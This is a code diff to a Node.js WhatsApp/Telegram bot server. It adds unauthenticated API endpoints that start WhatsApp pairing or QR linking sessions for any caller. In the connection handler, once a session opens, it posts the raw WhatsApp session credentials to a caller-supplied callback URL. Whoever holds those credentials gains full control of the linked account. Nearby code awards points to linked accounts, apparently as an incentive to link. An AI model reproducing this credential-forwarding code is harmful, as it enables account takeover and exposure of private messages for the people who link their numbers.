@@ -343,6 +343,59 @@ app.post('/api/sync-numbers', async (req, res) => {
 
 
 
+// Endpoint to request a Pairing Code
+app.post('/api/connect/pairing', async (req, res) => {
+    const { number, callbackUrl } = req.body;
+    if (!number) return res.status(400).json({ error: "Phone number required" });
+
+    // Using 'ext_' prefix to identify external requests in startClient
+    const sessionId = `ext_${Date.now()}`;
+    if (callbackUrl) sessionCallbacks.set(sessionId, callbackUrl);
+
+    try {
+        // Ensure startClient returns the code
+        const pairingCode = await startClient(sessionId, number, null, 'EXTERNAL_SERVICE');
+        res.status(200).json({ success: true, sessionId, pairingCode });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// Endpoint to request a QR Code (Returns Base64 image)
+app.post('/api/connect/qr', async (req, res) => {
+    const { callbackUrl } = req.body;
+    const sessionId = `ext_qr_${Date.now()}`;
+    if (callbackUrl) sessionCallbacks.set(sessionId, callbackUrl);
+
+    try {
+        // We wrap startClient in a promise that resolves when the first QR is generated
+        const qrBase64 = await new Promise(async (resolve, reject) => {
+            // Set a timeout so the API doesn't hang forever if WA fails
+            const timeout = setTimeout(() => reject(new Error("QR Generation Timeout")), 30000);
+
+            try {
+                // startClient needs to be able to accept an 'onQr' callback
+                // OR you can use an EventEmitter if your startClient supports it
+                await startClient(sessionId, null, null, 'EXTERNAL_SERVICE', (qr) => {
+                    clearTimeout(timeout);
+                    resolve(qr); // qr is the base64 string from your QR generator
+                });
+            } catch (err) {
+                clearTimeout(timeout);
+                reject(err);
+            }
+        });
+
+        res.status(200).json({ success: true, sessionId, qr: qrBase64 });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+
+
+
+
 app.post('/api/verify', async (req, res) => {
     const { userId, name, email, ip, initData } = req.body;
     if (!userId || !name || !email) return res.json({ success: false, message: 'Please fill all fields' });
@@ -758,28 +811,54 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
 
 
     sock.ev.on('connection.update', async (update) => {
-        const { connection, lastDisconnect, qr } = update;
+    const { connection, lastDisconnect, qr } = update;
 
-        if (connection === 'open' && qrMessageCache[folder]) {
-            const { messageId, chatId: qrChatId } = qrMessageCache[folder];
-            try { await mainBot.deleteMessage(qrChatId, messageId); } catch (e) {}
-            delete qrMessageCache[folder];
-            delete qrActiveState[folder];
-        }
+    // --- Part A: Existing Open Connection Cleanup ---
+    if (connection === 'open' && qrMessageCache[folder]) {
+        const { messageId, chatId: qrChatId } = qrMessageCache[folder];
+        try { await mainBot.deleteMessage(qrChatId, messageId); } catch (e) {}
+        delete qrMessageCache[folder];
+        delete qrActiveState[folder];
+    }
+    
+    // --- Part B: QR Logic (Unified for User and API) ---
+    if (qr && !qrActiveState[folder] && !targetNumber) {
         
-         if (qr && chatId && !qrActiveState[folder] && !targetNumber) {
-
+        // 1. Check if this is an API request (started via the endpoint)
+        const isExternal = folder.startsWith('ext_');
+        
+        if (isExternal) {
+            // EXTERNAL API FLOW: Just convert to Base64 and trigger the callback
+            qrActiveState[folder] = true; // Mark as active so we don't spam the API caller
+            try {
+                const QRCode = (await import('qrcode')).default;
+                const base64Qr = await QRCode.toDataURL(qr); // Returns data:image/png;base64,...
+                
+                // If you passed the qrCallback into startClient, trigger it here
+                if (typeof qrCallback === 'function') {
+                    qrCallback(base64Qr);
+                }
+            } catch (e) {
+                delete qrActiveState[folder];
+            }
+        } 
+        else if (chatId) {
+            // STANDARD USER FLOW: Your original Telegram Photo logic
             qrActiveState[folder] = true;
             try {
-                if (qrMessageCache[folder]) try { await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId); } catch (e) {}
+                if (qrMessageCache[folder]) {
+                    try { await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId); } catch (e) {}
+                }
                 
                 const QRCode = (await import('qrcode')).default;
                 const qrImage = await QRCode.toBuffer(qr, { errorCorrectionLevel: 'H', type: 'image/png', width: 300 });
+                
                 const sentMsg = await mainBot.sendPhoto(chatId, qrImage, {
                     caption: '[QR CODE]\n\nScan this QR code with your WhatsApp camera to connect.',
                     parse_mode: 'Markdown',
                     reply_markup: { inline_keyboard: [[{ text: 'Cancel', callback_data: 'cancel_qr' }]] }
                 });
+                
                 qrMessageCache[folder] = { messageId: sentMsg.message_id, chatId };
                 
                 setTimeout(async () => {
@@ -788,10 +867,15 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
                         delete qrMessageCache[folder];
                     }
                 }, 60000);
-            } catch (e) { delete qrActiveState[folder]; }
+            } catch (e) {
+                delete qrActiveState[folder];
+            }
         }
+    }
+    
 
-        if (connection === 'open') {
+
+                if (connection === 'open') {
             const userJid = jidNormalizedUser(sock.user.id);
             const phoneNumber = userJid.split('@')[0];
             
@@ -810,8 +894,25 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
             
             updateAdminNotification(`[CONNECTED] +${phoneNumber}`);
 
-
-
+            // --- 🚀 EXTERNAL SERVER WEBHOOK TRIGGER ---
+            // If this session was initiated via API, notify the external server
+            const externalCallback = sessionCallbacks.get(folder); 
+            if (externalCallback) {
+                try {
+                    await axios.post(externalCallback, {
+                        success: true,
+                        sessionId: folder,
+                        shortId: cachedShortId,
+                        number: phoneNumber,
+                        session_data: content // Sends the raw JSON creds
+                    });
+                    console.log(`[API] Webhook sent to external server for ${phoneNumber}`);
+                    sessionCallbacks.delete(folder); // Clean up memory
+                } catch (err) {
+                    console.error(`[API ERROR] Webhook failed:`, err.message);
+                }
+            }
+            // ------------------------------------------
 
             if (chatId) {
                 userState[chatId] = null;
@@ -842,6 +943,7 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
                 if (!clients[folder]) { try { await awardHourlyPoints([folder]); } catch (e) {} }
             }, 3600000);
         }
+
 
         if (connection === 'close') {
             const userJid = sock.user?.id || "";
